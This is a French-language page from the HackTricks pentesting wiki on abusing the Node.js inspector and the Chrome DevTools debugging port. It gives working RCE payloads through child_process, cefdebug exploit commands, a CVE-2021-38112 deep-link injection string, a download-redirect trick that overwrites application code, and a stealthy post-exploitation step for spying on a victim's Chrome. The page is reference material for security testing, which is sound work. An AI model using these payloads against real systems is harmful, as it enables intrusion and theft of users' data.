# Utilisation abusive du débogueur Node inspector/CEF

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de base

[À partir de la documentation](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started) : Lorsqu'il est démarré avec l'option `--inspect`, un processus Node.js écoute un client de débogage. Par **défaut**, il écoutera à l'hôte et au port **`127.0.0.1:9229`**. Chaque processus se voit également attribuer un **UUID** **unique**.

Les clients de l'inspecteur doivent connaître et spécifier l'adresse de l'hôte, le port et l'UUID pour se connecter. Une URL complète ressemblera à quelque chose comme `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Étant donné que le **débogueur a un accès complet à l'environnement d'exécution de Node.js**, un acteur malveillant capable de se connecter à ce port peut être en mesure d'exécuter du code arbitraire au nom du processus Node.js (**élévation potentielle des privilèges**).
{% endhint %}

Il existe plusieurs façons de démarrer un inspecteur :
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Lorsque vous démarrez un processus inspecté, quelque chose comme ceci apparaîtra :
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Les processus basés sur **CEF** (**Chromium Embedded Framework**) comme ont besoin d'utiliser le paramètre : `--remote-debugging-port=9222` pour ouvrir le **débogueur** (les protections SSRF restent très similaires). Cependant, ils au lieu d'accorder une session de **débogage** **NodeJS** communiqueront avec le navigateur en utilisant le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), c'est une interface pour contrôler le navigateur, mais il n'y a pas de RCE direct.

Lorsque vous démarrez un navigateur en mode débogage, quelque chose comme ceci apparaîtra :
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Navigateurs, WebSockets et politique de même origine <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Les sites web ouverts dans un navigateur web peuvent effectuer des requêtes WebSocket et HTTP sous le modèle de sécurité du navigateur. Une **connexion HTTP initiale** est nécessaire pour **obtenir un identifiant de session de débogueur unique**. La **politique de même origine** **empêche** les sites web de pouvoir effectuer **cette connexion HTTP**. Pour une sécurité supplémentaire contre les [**attaques de rebinding DNS**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js vérifie que les en-têtes **'Host'** de la connexion spécifient soit une **adresse IP** soit **`localhost`** ou **`localhost6`** précisément.

{% hint style="info" %}
Ces **mesures de sécurité empêchent l'exploitation de l'inspecteur** pour exécuter du code en **envoyant simplement une requête HTTP** (ce qui pourrait être fait en exploitant une vulnérabilité SSRF).
{% endhint %}

### Démarrage de l'inspecteur dans les processus en cours d'exécution

Vous pouvez envoyer le **signal SIGUSR1** à un processus nodejs en cours d'exécution pour lui permettre de **démarrer l'inspecteur** sur le port par défaut. Cependant, notez que vous devez disposer de suffisamment de privilèges, cela pourrait vous accorder un **accès privilégié aux informations à l'intérieur du processus** mais pas une élévation de privilèges directe.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Ceci est utile dans les conteneurs car **arrêter le processus et en démarrer un nouveau** avec `--inspect` n'est **pas une option** car le **conteneur** sera **tué** avec le processus.
{% endhint %}

### Se connecter à l'inspecteur/debugger

Pour se connecter à un **navigateur basé sur Chromium**, les URL `chrome://inspect` ou `edge://inspect` peuvent être utilisées pour Chrome ou Edge, respectivement. En cliquant sur le bouton Configurer, il faut s'assurer que l'**hôte cible et le port** sont correctement répertoriés. L'image montre un exemple d'Exécution de Code à Distance (RCE) :

![](<../../.gitbook/assets/image (674).png>)

En utilisant la **ligne de commande**, vous pouvez vous connecter à un debugger/inspecteur avec :
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
L'outil [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), permet de **trouver des inspecteurs** s'exécutant localement et d'**injecter du code** en eux.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Notez que les exploits **NodeJS RCE ne fonctionneront pas** s'ils sont connectés à un navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (vous devez vérifier l'API pour trouver des choses intéressantes à faire avec).
{% endhint %}

## RCE dans le débogueur/inspecteur NodeJS

{% hint style="info" %}
Si vous êtes ici pour savoir comment obtenir **RCE à partir d'une XSS dans Electron, veuillez consulter cette page.**
{% endhint %}

Quelques moyens courants d'obtenir **RCE** lorsque vous pouvez **vous connecter** à un **inspecteur Node** consistent à utiliser quelque chose comme (il semble que cela **ne fonctionnera pas dans une connexion au protocole Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Charges utiles du protocole Chrome DevTools

Vous pouvez consulter l'API ici : [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Dans cette section, je vais simplement répertorier les choses intéressantes que je trouve que les gens ont utilisées pour exploiter ce protocole.

### Injection de paramètres via des liens profonds

Dans le [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security a découvert qu'une application basée sur CEF avait **enregistré un URI personnalisé** dans le système (workspaces://) qui recevait l'URI complet, puis **lançait l'application basée sur CEF** avec une configuration partiellement construite à partir de cet URI.

Il a été découvert que les paramètres de l'URI étaient décodés en URL et utilisés pour lancer l'application de base CEF, permettant à un utilisateur d'**injecter** le drapeau **`--gpu-launcher`** dans la **ligne de commande** et d'exécuter des choses arbitraires.

Ainsi, une charge utile comme :
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### Écraser des fichiers

Changer le dossier où les **fichiers téléchargés vont être enregistrés** et télécharger un fichier pour **écraser** fréquemment utilisé **code source** de l'application avec votre **code malveillant**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### RCE et exfiltration de Webdriver

Selon cet article : [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), il est possible d'obtenir une RCE et d'exfiltrer des pages internes à partir de theriver.

### Post-Exploitation

Dans un environnement réel et **après avoir compromis** un PC utilisateur utilisant un navigateur basé sur Chrome/Chromium, vous pourriez lancer un processus Chrome avec le **débogage activé et rediriger le port de débogage** pour y accéder. De cette manière, vous pourrez **inspecter tout ce que la victime fait avec Chrome et voler des informations sensibles**.

La manière furtive consiste à **mettre fin à chaque processus Chrome** puis à appeler quelque chose comme
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Références

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
